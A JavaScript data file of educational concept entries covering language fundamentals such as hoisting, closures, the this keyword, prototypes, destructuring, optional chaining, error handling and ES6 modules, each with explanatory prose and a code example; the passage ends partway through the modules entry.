export const concepts = [
  // ═══════════════════════════════════════════
  // JAVASCRIPT — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Variables & Data Types',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Understanding var, let, const, and JavaScript\'s dynamic type system.',
    content: 'JavaScript has three ways to declare variables: var (function-scoped, hoisted), let (block-scoped, not hoisted), and const (block-scoped, immutable binding). JavaScript is dynamically typed — a variable can hold any type without declaration. The primitive types are: string, number, bigint, boolean, undefined, symbol, and null. typeof operator checks types at runtime. Always use const by default, let when reassignment is needed, and avoid var entirely.\n\nVariables in JavaScript are not directly tied to a specific type like in statically typed languages such as Java or C++. Instead, they act as labels or references that point to values stored in memory. When you declare a variable with const, you are creating an immutable binding — the variable cannot be reassigned to a different value, but the value itself (if it is an object or array) can still be mutated. This distinction is critical: const prevents reassignment, not mutation. For example, you can push items into a const array, but you cannot assign a new array to that variable. Let, on the other hand, allows full reassignment and is the preferred choice when you know a variable will need to change its binding over time.\n\nJavaScript\'s type system includes seven primitive types and one compound type (object). Primitives are immutable — operations on strings, for instance, always return new strings rather than modifying the original. The number type is a 64-bit IEEE 754 floating-point value, which means it cannot precisely represent very large integers beyond 2^53 - 1. For those cases, BigInt was introduced in ES2020. The null and undefined types are often confused: undefined means a variable has been declared but not assigned, while null is an intentional assignment of "no value." Interestingly, typeof null returns "object" due to a historical bug in JavaScript\'s first implementation that was never fixed for backward compatibility reasons.\n\nCommon pitfalls include relying on typeof for complex type checking (it returns "object" for arrays, functions, and null), not understanding that const does not make objects immutable, and accidentally using var in block contexts like loops or conditionals where its function-scoped behavior leads to unexpected variable leaks. Best practice is to always use const by default, switch to let only when reassignment is genuinely needed, and never use var in modern JavaScript. For type checking, use Array.isArray() for arrays, instanceof for custom objects, and consider TypeScript for compile-time type safety',
    example: `const name = "Alice";     // string
const age = 25;            // number
const big = 9007199254740991n; // bigint
const active = true;       // boolean
let score;                 // undefined
const empty = null;        // null

console.log(typeof name);  // "string"
console.log(typeof age);   // "number"
console.log(typeof empty); // "object" (historic bug)`
  },
  {
    title: 'Hoisting',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'JavaScript moves declarations to the top of their scope during compilation.',
    content: 'Hoisting allows you to use functions and variables before they are declared. However, only declarations are hoisted, not initializations. Variables declared with "var" are hoisted and initialized as "undefined", while "let" and "const" are hoisted but sit in a "temporal dead zone" (TDZ) — accessing them before declaration throws a ReferenceError. Function declarations are fully hoisted (name + body). Function expressions and arrow functions follow variable hoisting rules.\n\nHoisting is not a physical movement of code — the JavaScript engine does not literally move declarations to the top of the file. Instead, during the compilation phase (before code execution), the engine scans the code and creates bindings for all variable and function declarations in the current scope. This means that during the creation phase, var-declared variables are already bound and initialized to undefined, while let and const declarations are bound but remain uninitialized until the actual line of code is reached during execution. This uninitialized state is what constitutes the temporal dead zone — a period during which the variable exists in the scope but cannot be accessed without throwing a ReferenceError.\n\nFunction declarations are hoisted completely — both the name and the function body are available throughout the scope. This is why you can call a function before its declaration appears in the code. However, function expressions (including arrow functions assigned to variables) are only partially hoisted: the variable name is hoisted, but the assignment (the function itself) is not. So if you try to call a function expression before its line of execution, you will get a TypeError — the variable exists but holds undefined, and undefined is not callable. This is one of the most common sources of confusion for developers new to JavaScript.\n\nUnderstanding hoisting is essential for debugging unexpected behavior. For example, if you declare the same variable multiple times with var, JavaScript will merge the declarations but keep the last assignment. This can lead to subtle bugs where a variable appears to have an unexpected value. The use of let and const avoids this problem entirely because they are block-scoped and subject to the TDZ, which forces you to declare variables before using them. Modern linters like ESLint enforce rules that prevent variable redeclaration and encourage the use of const and let over var. Always declare variables at the top of their scope for clarity, and use block-scoped declarations to prevent accidental variable sharing across iterations or conditional blocks',
    example: `console.log(x); // undefined (var is hoisted)
var x = 5;

foo(); // "Hello" (function declaration fully hoisted)
function foo() { console.log("Hello"); }

// bar(); // ReferenceError! (temporal dead zone)
// let bar = () => {};`
  },
  {
    title: 'Closures',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'A function bundled with its lexical environment — the foundation of data privacy.',
    content: 'A closure is created when a function retains access to variables from its outer scope, even after the outer function has returned. Every function in JavaScript creates a closure. Closures are used for data privacy (module pattern), function factories, event handlers, and maintaining state in async operations. The inner function "closes over" the outer variables, keeping them alive in memory.\n\nTo understand closures deeply, you need to understand how JavaScript\'s scope chain works. When a function is created, it receives a reference to its outer lexical environment — the scope in which it was defined. This reference persists even after the outer function has finished executing. The closure therefore consists of the function itself plus the lexical environment it references. This is fundamentally different from languages like C or Java where local variables are destroyed when a function returns. In JavaScript, as long as a reference to the inner function exists, the outer scope\'s variables remain accessible and are not garbage collected.\n\nClosures have profound implications for memory management and data privacy. Because the outer scope\'s variables are captured by reference (not by value), modifications to those variables inside the closure are reflected outside. This enables patterns like the module pattern, where an IIFE (Immediately Invoked Function Expression) creates a private scope and exposes only the desired public interface. Closures are also the mechanism behind partial application, currying, and memoization — all of which rely on a function remembering its creation context. In event handlers and callbacks, closures capture the state at the time they were defined, which can lead to stale references if not carefully managed.\n\nCommon pitfalls with closures include creating closures in loops (where all closures share the same variable reference, leading to the classic "var in loop" bug), accidentally holding references to large objects (causing memory leaks), and misunderstanding how closures capture variables by reference rather than by value. The loop closure problem is particularly notorious: when using var in a for-loop, all callbacks created inside the loop reference the same variable, which has already changed by the time the callbacks execute. Using let instead of var creates a new binding for each iteration, solving this problem. In modern JavaScript, closures are everywhere — they are the foundation of React hooks, event handlers, middleware patterns, and functional programming techniques. Understanding them is not optional; it is essential for writing correct JavaScript',
    example: `function createCounter() {
  let count = 0;
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count
  };
}
const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
counter.getCount();  // 2
// count is private — not accessible outside`
  },
  {
    title: 'This Keyword',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Refers to the execution context — its value depends on HOW a function is called.',
    content: 'The "this" keyword behaves differently based on context: (1) Global: window in browsers, (2) Object method: the object, (3) Function: window (strict: undefined), (4) Arrow function: inherits "this" from enclosing scope, (5) Constructor: the new instance, (6) Explicit: call/apply/bind. Arrow functions do NOT have their own "this" — they capture it lexically. This is the most common source of bugs in JavaScript.\n\nThe value of "this" is determined at call time, not at definition time (except for arrow functions). This dynamic binding is what makes "this" so confusing. In a regular function, "this" depends on how the function is called. When you call a method as an object property (obj.method()), "this" refers to obj. But if you extract that method and call it separately (const fn = obj.method; fn()), "this" is no longer bound to obj — it becomes the global object (or undefined in strict mode). This is the "method detachment" problem and it is the root cause of countless bugs, especially in callback-heavy code like event handlers and promise chains.\n\nArrow functions solve the "this" problem elegantly by inheriting "this" from their enclosing lexical scope. This means "this" inside an arrow function is the same as "this" in the code where the arrow function was defined, not where it is called. This makes arrow functions ideal for callbacks, especially in class methods and event handlers where you want to preserve the surrounding "this" context. However, arrow functions cannot be used as constructors, they do not have their own arguments object, and they should not be used as object methods if you need "this" to refer to the object itself.\n\nThe three methods for explicit "this" binding are call, apply, and bind. Call invokes a function with a specified "this" and individual arguments. Apply is similar but takes an array of arguments. Bind creates a new function with "this" permanently bound to the provided value — it does not invoke the function immediately. These methods are essential for function composition, method borrowing, and adapting callbacks. Common mistakes include forgetting to bind event handlers, using arrow functions as class methods when "this" needs to be dynamic, and not understanding that "this" in a nested function does not automatically refer to the enclosing class instance. Always be deliberate about which binding behavior you need',
    example: `const person = {
  name: "Alice",
  greet() { console.log("Hi, " + this.name); },   // "Alice"
  greetArrow: () => console.log(this)              // window!
};

person.greet(); // "Hi, Alice"

const detached = person.greet;
detached();     // "Hi, undefined" (this lost)

// Fix with bind:
const bound = person.greet.bind(person);
bound();        // "Hi, Alice"`
  },
  {
    title: 'Prototypes',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'The mechanism by which JavaScript objects inherit features from one another.',
    content: 'Every JavaScript object has a hidden [[Prototype]] link to another object. When you access a property, JS first looks on the object, then walks up the prototype chain until it finds it or reaches null. Object.create() sets the prototype explicitly. __proto__ is the accessor, Object.getPrototypeOf() is the standard way. Prototype-based inheritance is the foundation of JavaScript\'s object system, predating ES6 classes.\n\nPrototypal inheritance works fundamentally differently from classical inheritance in languages like Java or C++. In classical inheritance, classes inherit from other classes in a rigid hierarchy. In JavaScript, objects inherit directly from other objects. Every object can have a link to another object (its prototype), and when a property is not found on the object itself, JavaScript walks up the prototype chain until it finds the property or reaches null (the end of the chain). This means that multiple objects can share the same prototype, and changes to the prototype are immediately visible to all objects that inherit from it. This is how methods like toString() and hasOwnProperty() are available on all objects — they are defined on Object.prototype, which sits at the top of almost every object\'s prototype chain.\n\nThe __proto__ property is the accessor that provides access to an object\'s prototype, but it is not the same as the internal [[Prototype]] link. The recommended way to get or set an object\'s prototype is Object.getPrototypeOf() and Object.setPrototypeOf() (or Object.create() for initial setup). Using __proto__ directly is deprecated and has performance implications. When you use the new keyword with a constructor function, the new object\'s [[Prototype]] is set to the constructor\'s .prototype property. This is why constructor functions and classes share methods — all instances point to the same prototype object.\n\nES6 classes are syntactic sugar over prototypal inheritance. Under the hood, class methods are added to the constructor\'s prototype object, and extends sets up the prototype chain between the child and parent constructors. Understanding the prototype chain is essential for debugging — when you see a property or method on an object that you did not define, it likely comes from the prototype chain. It also explains why for...in loops iterate over inherited properties (unlike Object.keys() which only returns own properties). Common pitfalls include modifying built-in prototypes (which can break other code), forgetting that prototype changes affect all existing instances, and not understanding the difference between own properties and inherited properties',
    example: `const animal = { eats: true, walk() { return "walking"; } };
const rabbit = Object.create(animal);
rabbit.jumps = true;

console.log(rabbit.eats);   // true (inherited)
console.log(rabbit.jumps);  // true (own)
console.log(rabbit.walk()); // "walking"

console.log(Object.getPrototypeOf(rabbit) === animal); // true`
  },
  {
    title: 'Arrow Functions',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Concise function syntax with lexical "this" binding.',
    content: 'Arrow functions (=>) provide a shorter syntax and lexically bind "this" — they inherit "this" from the enclosing scope. They cannot be used as constructors, have no arguments object, and cannot be used as generator functions. Best for callbacks, array methods, and functional programming. Not suitable for object methods, prototype methods, or constructors.\n\nArrow functions were introduced in ES6 primarily to solve the "this" binding problem that plagued callback-heavy JavaScript code. Before arrow functions, developers had to use workarounds like self = this, .bind(this), or var that = this to preserve the surrounding context inside callbacks. Arrow functions eliminate this entirely by lexically binding "this" — the value of "this" is determined by the surrounding code, not by how the function is called. This makes them ideal for use as callbacks in array methods like map, filter, and reduce, where you want "this" to refer to the enclosing scope rather than the callback\'s own execution context.\n\nThe syntax differences between arrow functions and regular functions go beyond just "this" binding. Arrow functions have an implicit return when the body is a single expression (no braces or return keyword needed). They do not have an arguments object — if you need access to arguments, use rest parameters (...args). They cannot be used as constructors with the new keyword and will throw a TypeError if attempted. They also lack their own prototype property, which means they cannot be used as prototype methods. These limitations are by design — arrow functions are intentionally simpler and more focused than regular functions.\n\nWhen to use arrow functions: callbacks and higher-order functions (array methods, promises, event handlers), functional programming patterns (composition, currying, partial application), and anywhere you want concise syntax with lexical "this". When NOT to use them: object methods (use shorthand method syntax), prototype methods (use regular functions), constructors (use class or function constructors), and situations where you need dynamic "this" binding (like in event handlers on DOM elements where "this" should refer to the element). Understanding these distinctions prevents subtle bugs and leads to cleaner, more maintainable code',
    example: `// Traditional
function add(a, b) { return a + b; }

// Arrow
const add = (a, b) => a + b;

// Single param — no parens needed
const double = x => x * 2;

// No params
const greet = () => "Hello!";

// Multi-line body
const process = (items) => {
  const result = items.map(i => i * 2);
  return result.filter(i => i > 4);
};`
  },
  {
    title: 'Destructuring',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Extract values from arrays and objects into distinct variables.',
    content: 'Destructuring makes code cleaner by extracting only needed properties. Array destructuring uses position, object destructuring uses key matching. Supports defaults, renaming, nested destructuring, and rest patterns. Works with function parameters too.\n\nDestructuring assignment is one of the most powerful and frequently used features in modern JavaScript. It allows you to unpack values from arrays or properties from objects into distinct variables, making code significantly more concise and readable. Before destructuring, you had to access each property individually (const name = user.name; const age = user.age;), which became tedious with deeply nested objects or when you only needed a few properties from a large data structure. Destructuring eliminates this boilerplate and makes the intent of your code immediately clear.\n\nObject destructuring matches properties by key name, not by position. You can rename variables during destructuring (const { name: userName } = user), provide default values for missing properties (const { role = "user" } = user), and destructure nested objects (const { address: { city } } = user). When destructuring objects, the variable names must match the property names — if you need different variable names, use the renaming syntax. You can also use computed property names with square brackets. Rest syntax (...rest) collects remaining properties into a new object, which is useful for separating known from unknown properties.\n\nArray destructuring works by position, not by name. The first variable gets the first element, the second gets the second, and so on. You can skip elements by leaving a blank between commas (const [first, , third] = arr). Rest syntax (...rest) collects remaining elements into an array. Default values work the same as object destructuring. A particularly powerful pattern is using destructuring with function parameters to extract specific properties from a configuration object or API response. This is heavily used in React (props destructuring) and in modern API design. Common pitfalls include trying to destructure null or undefined (which throws a TypeError), forgetting that destructuring creates bindings (not references) for primitives, and nesting destructuring too deeply which hurts readability',
    example: `// Object destructuring
const user = { id: 1, name: "Joe", age: 25, city: "NYC" };
const { name, age } = user;  // name="Joe", age=25
const { name: userName } = user; // rename to userName

// Array destructuring
const [first, , third] = [10, 20, 30]; // first=10, third=30

// Defaults
const { role = "student" } = {}; // role="student"

// Nested
const { address: { zip } } = { address: { zip: "10001" } };

// Function params
function greet({ name, age }) {
  return \`\${name} is \${age}\`;
}`
  },
  {
    title: 'Spread & Rest Operators',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: '... expands iterables (spread) or collects them (rest).',
    content: 'Spread (...) expands an iterable into individual elements. Used for copying arrays/objects, merging, and passing arguments. Rest (...) collects multiple elements into an array. Used in function parameters and destructuring. They look the same but work in opposite directions.\n\nThe spread operator (...) is one of the most versatile tools in modern JavaScript. It was introduced in ES6 and expands an iterable (array, string, object, map, set) into individual elements. When used with arrays, it creates a shallow copy — this is the recommended way to duplicate arrays (const copy = [...original]). When used with objects, it copies own enumerable properties into a new object, which is the standard pattern for immutable updates (const updated = { ...original, key: newValue }). Spread can also be used to pass arguments to functions that expect individual parameters (Math.max(...numbers)) and to convert iterables to arrays ([...document.querySelectorAll(\'div\')]).\n\nThe rest operator (...) looks identical to spread but does the opposite — it collects multiple elements into an array. In function parameters, rest parameters gather all remaining arguments into an array (function sum(...args) { return args.reduce((a, b) => a + b, 0); }). In destructuring, rest collects the remaining elements (const [first, ...rest] = arr) or properties (const { name, ...rest } = obj). Rest parameters must be the last parameter in a function signature. This distinction between spread and rest is purely contextual: spread expands, rest collects.\n\nCommon use cases include immutable data patterns (essential for React state management), merging configurations (const config = { ...defaults, ...userConfig }), creating function arguments dynamically, and implementing variadic functions. The spread operator creates shallow copies, which means nested objects and arrays are still shared references — this can lead to unintended mutations if you are not careful. For deep cloning, you need structuredClone() or a library like lodash. Performance considerations: spread creates a new array/object every time, so in performance-critical code with large datasets, consider whether the immutability overhead is worth it. The rest operator is particularly useful for forward-compatible APIs where you want to accept and pass through additional arguments without modifying the function signature',
    example: `// Spread — expanding
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5]; // [1,2,3,4,5]
const copy = [...arr1];        // shallow copy

const obj1 = { a: 1, b: 2 };
const obj2 = { ...obj1, c: 3 }; // {a:1, b:2, c:3}

// Rest — collecting
function sum(...nums) {
  return nums.reduce((a, b) => a + b, 0);
}
sum(1, 2, 3, 4); // 10

const [head, ...tail] = [1, 2, 3]; // head=1, tail=[2,3]`
  },
  {
    title: 'Template Literals',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Enhanced string syntax with interpolation and multi-line support.',
    content: 'Template literals use backticks (`) instead of quotes. They support expression interpolation with ${}, multi-line strings without concatenation, and tagged templates for advanced processing. They are the modern way to build strings in JavaScript.\n\nTemplate literals were introduced in ES6 as a replacement for string concatenation and the awkward + operator chains that plagued JavaScript code. Instead of writing "Hello, " + name + "! You are " + age + " years old.", you can write `Hello, ${name}! You are ${age} years old.` The interpolation syntax ${expression} accepts any valid JavaScript expression — function calls, arithmetic, ternary operators, and even other template literals. This makes string construction far more readable and less error-prone than concatenation, especially when building complex strings like HTML templates or SQL queries.\n\nMulti-line strings are another major advantage of template literals. Before their introduction, creating multi-line strings required escaped newlines (\n) or array joining tricks. Template literals allow natural multi-line strings by simply including line breaks in the backtick-delimited string. This is particularly useful for building HTML templates, email bodies, SQL queries, and any text that naturally spans multiple lines. The indentation is preserved as-is, so you may want to use a dedent utility or be mindful of extra whitespace.\n\nTagged templates are an advanced feature that allows you to process a template literal through a custom function. The function receives the raw string segments as an array and the interpolated values as separate arguments. This enables powerful patterns like syntax highlighting (highlight`const x = ${value}`), SQL query builders that prevent injection (sql`SELECT * FROM users WHERE id = ${id}`), internationalization (i18n`Welcome, ${name}!`), and HTML sanitization. Tagged templates are used extensively in libraries like styled-components, lit-html, and Emotion. They are the most complex aspect of template literals but also the most powerful, enabling domain-specific languages directly in JavaScript syntax',
    example: `const name = "Alice";
const age = 25;

// Interpolation
const msg = \`Hello, \${name}! You are \${age}.\`;

// Multi-line
const html = \`
  <div class="card">
    <h2>\${name}</h2>
    <p>Age: \${age}</p>
  </div>
\`;

// Tagged template
function highlight(strings, ...values) {
  return strings.reduce((result, str, i) =>
    result + str + (values[i] ? \`**\${values[i]}**\` : ''), '');
}
highlight("Name:", name); // "Name:**Alice**"`
  },
  {
    title: 'Optional Chaining',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Safe property access that returns undefined instead of throwing.',
    content: 'Optional chaining (?.) short-circuits and returns undefined if the value before it is null or undefined. Works with property access (obj?.prop), method calls (obj?.method()), array access (arr?.[0]), and function calls (fn?.()). Prevents "Cannot read property of undefined" errors.\n\nOptional chaining, introduced in ES2020, solves one of the most common and frustrating error patterns in JavaScript: "Cannot read property of undefined" or "Cannot read property of null." Before optional chaining, developers had to write verbose defensive code like user && user.profile && user.profile.address && user.profile.address.city to safely access nested properties. This pattern was not only tedious but also error-prone — a single missing && in a deep chain could cause a runtime crash. Optional chaining condenses all of this into a single, readable expression: user?.profile?.address?.city.\n\nOptional chaining works with multiple access patterns beyond simple property access. You can use it for method calls (user?.getProfile?.()), which prevents calling undefined functions. You can use it for array access (arr?.[0]), which safely handles undefined or null arrays. You can combine it with the nullish coalescing operator (??) to provide default values: user?.profile?.settings?.theme ?? "dark". The short-circuiting behavior means that if any part of the chain is null or undefined, the entire expression evaluates to undefined without evaluating any further parts. This is not just syntactic sugar — it genuinely prevents the evaluation of subsequent expressions, which matters when those expressions have side effects.\n\nOptional chaining is particularly valuable when working with API responses, configuration objects, deeply nested data structures, and DOM queries. It is not a replacement for thorough validation — if you need to handle missing data meaningfully (e.g., showing an error message or falling back to a default), you should still validate explicitly. Optional chaining is best for cases where undefined is an acceptable result and your code can handle it downstream. Common mistakes include overusing optional chaining when proper validation would be more appropriate, using it on values that should never be null/undefined (which masks real bugs), and forgetting that it only checks for null/undefined — not for empty strings, 0, or false',
    example: `const user = {
  profile: {
    address: {
      city: "NYC"
    }
  }
};

// Without optional chaining (risky)
const city1 = user && user.profile && user.profile.address && user.profile.address.city;

// With optional chaining
const city2 = user?.profile?.address?.city; // "NYC"
const zip = user?.profile?.address?.zip;     // undefined (no error)
const phone = user?.contact?.phone;          // undefined (no error)

// Method calls
user?.getProfile?.(); // undefined if method doesn't exist`
  },
  {
    title: 'Nullish Coalescing',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: '?? provides a default value only for null/undefined, not falsy values.',
    content: 'The nullish coalescing operator (??) returns the right-hand side only when the left is null or undefined. Unlike ||, it does NOT treat 0, "", or false as "empty". This makes it safer for providing defaults when 0 or "" are valid values.\n\nThe nullish coalescing operator, introduced in ES2020, addresses a subtle but important flaw in how JavaScript\'s logical OR (||) operator handles default values. The || operator treats any falsy value as "empty" — including 0, "", false, and NaN — and returns the right-hand side for all of them. This is problematic when 0 or an empty string are legitimate values that should not trigger a fallback. For example, if a user explicitly sets a quantity to 0, using || to provide a default of 1 would incorrectly override their intentional choice. The ?? operator only triggers the fallback for null and undefined, preserving all other values including falsy ones.\n\nThis distinction is critical in real-world applications. Consider a configuration object where timeout can be set to 0 to disable a timeout, or a search field where an empty string "" means the user wants to clear the filter. Using || would incorrectly override both of these intentional values. With ??, the developer\'s intent is preserved. The operator is particularly useful for providing default values for function parameters, handling optional configuration properties, and processing data from external sources where null and undefined represent truly missing values.\n\nThe ?? operator cannot be mixed directly with || or && without explicit parentheses due to ambiguity. This is a deliberate language restriction to prevent confusing expressions. You can write (a ?? b) || c or a ?? (b || c), but not a ?? b || c. In practice, you will rarely need to combine them. The most common pattern is using ?? for default values (const port = config.port ?? 3000) and || for conditional expressions (const display = name || "Anonymous"). Understanding when to use ?? versus || is a mark of a developer who understands JavaScript\'s type system deeply. Use ?? when null/undefined are the only values that should trigger a fallback. Use || when you want to treat all falsy values as "empty."',
    example: `// || treats 0, "", false as falsy
const a = 0 || 10;    // 10 (wrong if 0 is valid)
const b = "" || "hi";  // "hi" (wrong if empty string is valid)

// ?? only triggers on null/undefined
const c = 0 ?? 10;     // 0 (correct!)
const d = "" ?? "hi";  // "" (correct!)
const e = null ?? 10;  // 10
const f = undefined ?? 10; // 10

// Great for config defaults
const config = {
  timeout: 0 ?? 5000,   // 0 (intentional)
  retries: null ?? 3,   // 3 (fallback)
};`
  },
  {
    title: 'Short Circuit Evaluation',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Using &&, ||, and ?? for conditional logic without if-statements.',
    content: 'Logical operators in JavaScript return the actual value of the evaluated operand, not just true/false. || returns the first truthy value. && returns the first falsy value (or last if all truthy). This enables compact conditional expressions.\n\nUnlike most programming languages where logical operators return boolean values, JavaScript\'s || and && operators return the actual values of the operands. This is a direct consequence of JavaScript\'s truthy/falsy system and enables elegant patterns that would otherwise require explicit conditional statements. The || operator evaluates left to right and returns the first truthy value it encounters, or the last value if all are falsy. The && operator evaluates left to right and returns the first falsy value it encounters, or the last value if all are truthy. This behavior makes them useful as concise alternatives to if-else statements in many common scenarios.\n\nThe || operator is most commonly used for providing default values: const name = user.name || "Anonymous". This works because if user.name is falsy (undefined, null, "", 0), the operator returns "Anonymous". However, this pattern has the limitation discussed under nullish coalescing — it treats 0 and "" as empty. The && operator is used for conditional rendering (especially in React: {isLoggedIn && <Dashboard />}), conditional method calls (isValid && save()), and short-circuit evaluation where the right-hand side should only execute if the left-hand side is truthy.\n\nWhen chaining these operators, be aware of their evaluation order and precedence. && has higher precedence than ||, so a || b && c is evaluated as a || (b && c), not (a || b) && c. Parentheses clarify intent and prevent bugs. In React JSX, && is preferred over ternary for showing/hiding elements because it avoids rendering "0" when the condition is falsy with a numeric value. Common mistakes include using && for default values (use || or ?? instead), forgetting that && returns the left operand if it is falsy (which can cause unexpected rendering of falsy values in JSX), and mixing || and && without parentheses. Understanding these operators as value selectors rather than boolean operators is the key to using them effectively',
    example: `// || — default values
const name = user.name || "Anonymous";

// && — conditional rendering (React pattern)
const greeting = isLoggedIn && <h1>Welcome!</h1>;

// || — short circuit
false || "fallback";  // "fallback"
"hello" || "world";   // "hello"

// && — early return
isValid && save();

// Combining
const display = user?.name || "Guest";`
  },
  {
    title: 'Loops & Iteration',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'for, for...of, for...in, while, forEach, and iteration protocols.',
    content: 'JavaScript provides multiple loop constructs: for (index-based), for...of (iterables like arrays, strings), for...in (object keys), while (condition-based), do...while (runs at least once). Array methods like forEach, map, filter, reduce are functional alternatives. for...of uses the iteration protocol — works with any object implementing Symbol.iterator.\n\nJavaScript offers a rich set of iteration mechanisms, each suited to different use cases. The traditional for loop gives you full control over initialization, condition, and increment — it is the only loop where you can easily access the loop index, modify it, or use break/continue to control flow. It is ideal for situations where you need index access, bidirectional iteration, or complex loop control. The while loop evaluates its condition before each iteration and is useful when the number of iterations is unknown in advance. The do...while loop is similar but guarantees at least one execution, which is useful for menu systems or retry logic.\n\nThe for...of loop, introduced in ES6, iterates over the values of any iterable object — arrays, strings, maps, sets, NodeLists, and custom iterables. It respects the iteration protocol (Symbol.iterator), making it the most general-purpose iteration mechanism for values. Unlike forEach, for...of supports break, continue, and return for early exit. The for...in loop iterates over the enumerable property keys (not values) of an object. It walks the entire prototype chain, so you typically need hasOwnProperty() checks or Object.keys()/Object.entries() to filter to own properties. for...in is generally discouraged for arrays because it iterates over indices as strings, can include prototype properties, and does not guarantee order.\n\nFunctional array methods (map, filter, reduce, forEach, find, some, every) provide declarative alternatives to loops. They express intent more clearly and chain naturally for data transformation pipelines. However, they have overhead from function creation and cannot be exited early (except reduce, which can throw). In performance-critical code with large datasets, a traditional for loop may be faster. The choice between imperative loops and functional methods is often about readability and team conventions. Modern JavaScript favors functional methods for data transformation and for...of for side effects or when early exit is needed. Understanding all approaches lets you choose the most appropriate one for each situation',
    example: `const arr = [10, 20, 30];
const obj = { a: 1, b: 2, c: 3 };

// for
for (let i = 0; i < arr.length; i++) console.log(arr[i]);

// for...of (values)
for (const val of arr) console.log(val);

// for...in (keys)
for (const key in obj) console.log(key, obj[key]);

// while
let i = 0;
while (i < arr.length) { console.log(arr[i]); i++; }

// Functional
arr.forEach((val, i) => console.log(i, val));
const doubled = arr.map(x => x * 2);
const evens = arr.filter(x => x % 2 === 0);`
  },
  {
    title: 'Error Handling',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'try/catch/finally, custom errors, and defensive programming.',
    content: 'JavaScript uses try/catch/finally for runtime error handling. Errors are objects (Error, TypeError, ReferenceError, etc.). throw creates custom errors. finally always runs, even after return. Async code uses .catch() or try/catch with await. Always handle errors gracefully — never let them crash your app silently.\n\nError handling is a critical aspect of writing robust JavaScript applications. The try/catch/finally construct allows you to wrap code that might throw an error and handle it gracefully. The try block contains the code that might fail. The catch block receives an error object and executes when an error is thrown. The finally block always executes regardless of whether an error occurred — it is used for cleanup (closing connections, releasing resources) and runs even after a return statement in the try or catch blocks. If no error is thrown, the catch block is skipped entirely. If an error is thrown outside a try block, it propagates up the call stack until caught.\n\nJavaScript has several built-in error types that indicate different kinds of problems. Error is the base class. TypeError indicates a value is not of the expected type (calling undefined as a function, accessing properties on null). ReferenceError indicates an undefined variable is being used. SyntaxError indicates invalid code structure (caught during parsing, not runtime). RangeError indicates a value is outside its valid range. URIError and EvalError are less common. Custom errors can extend the Error class, allowing you to create domain-specific error types with additional context (ValidationError, NotFoundError, AuthenticationError). This makes error handling more precise and enables different handling strategies for different error types.\n\nAsync error handling requires different approaches depending on the async mechanism. For promises, use .catch() on the promise chain or wrap the await in a try/catch block inside an async function. Unhandled promise rejections crash Node.js processes (since v15) and show warnings in browsers. For event-based code, errors in event handlers are not automatically caught — you need to handle them within the handler. Error boundaries in React catch errors in the component tree and display fallback UI. Best practices include: always handling errors (never let them go uncaught), providing meaningful error messages, logging errors for debugging, implementing retry logic for transient failures, distinguishing between operational errors (network timeout) and programming errors (null reference), and using error types to guide recovery strategies. Never use try/catch around code that should throw — let errors propagate when they indicate bugs that need to be fixed',
    example: `// Basic try/catch
try {
  const data = JSON.parse(invalidJSON);
} catch (error) {
  console.error("Parse failed:", error.message);
} finally {
  console.log("Always runs");
}

// Custom errors
class ValidationError extends Error {
  constructor(field, message) {
    super(message);
    this.field = field;
    this.name = "ValidationError";
  }
}

function validateAge(age) {
  if (age < 0) throw new ValidationError("age", "Must be positive");
}

// Async error handling
async function fetchData() {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
    return await res.json();
  } catch (err) {
    console.error("Fetch failed:", err);
  }
}`
  },
  {
    title: 'Modules (ES6)',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Import/export system for organizing code into reusable modules.',
    content: 'ES6 modules use import/export to share code between files. export default exports one main thing per file. Named exports (export { }) allow multiple exports. Import { } destructures named exports. Import * as ns gets everything as a namespace. Modules are always in strict mode and have their own scope. Dynamic import() loads modules on demand.\n\nES6 modules are the official standard for JavaScript code organization, replacing the patchwork of module systems that emerged over the years (CommonJS, AMD, UMD). Modules provide several key benefits: they encapsulate code within their own scope (no global namespace pollution), they make dependencies explicit through import statements, they enable tree-shaking (dead code elimination by bundlers), and they support asynchronous loading. Every ES6 module is automatically in strict mode, which means you cannot use undeclared variables, with statements, or other non-strict features. Module scope is separate from the global scope — variables declared in a module are not accessible outside unless explicitly exported.\n\nNamed exports allow a module to export multiple values. You can export at declaration time (export const PI = 3.14159) or at the end of the file (export { PI, add, multiply }). When importing named exports, you destructure them: import { PI, add } from \'./math.js\'. You can also rename imports: import { PI as pi } from \'./math.js\'. The default export is a special named export that represents the "main" value of a module. Each module can have at most one default export. It can be imported with any name: import Calculator from \'./calc.js\'. Default exports are ideal for modules that export a single class, function, or value. The choice between named and default exports is a matter of convention and module design.\n\nDynamic import() enables loading modules on demand, which is essential for code splitting in web applications. It returns a promise that resolves to the module object: const module = await import(\'./heavy-module.js\'). This allows you to defer loading of large modules until they are actually needed, reducing initial page load time. Dynamic imports are commonly used in React (lazy()), in route-based code splitting, and in conditional feature loading. Tree-shaking is a build-time optimization that removes unused exports from the final bundle. It works because ES6 modules have static structure — imports and exports are declared at the top level and cannot be conditional. This static structure allows bundlers like webpack and Rollup to analyze which exports are actually used and eliminate the rest. To maximize tree-shaking, prefer named exports over default exports and avoid re-exporting entire modules',
    example: `// math.js — named exports
export const PI = 3.14159;
export function add(a, b) { return a + b; }
export default class Calculator { ... }

// app.js — importing
import Calculator, { PI, add } from './math.js';
import * as MathUtils from './math.js';

// Dynamic import (code splitting)
async function loadHeavyModule() {
  const { analyze } = await import('./analyzer.js');
  analyze(data);
}

// Re-export
